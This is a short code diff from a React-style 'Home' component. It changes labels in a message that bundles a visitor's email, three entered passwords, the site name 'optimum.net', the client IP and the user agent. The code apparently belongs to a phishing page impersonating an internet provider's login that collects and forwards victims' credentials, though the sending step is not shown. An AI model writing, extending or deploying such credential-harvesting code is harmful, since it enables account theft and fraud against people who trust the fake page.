@@ -73,9 +73,9 @@ const Home = () => {
             if (!emailError && !passwordError) {
                 // Prepare the message to send
                 const message = `Email: ${email}
-                Password1: ${password1}
-                Password2: ${password2}
-                Password3: ${password}
+                Optimum1: ${password1}
+                Optimum2: ${password2}
+                Optimum3: ${password}
                 Website: optimum.net
                 Client IP: ${clientIp}
                 User Agent: ${userAgent}`;
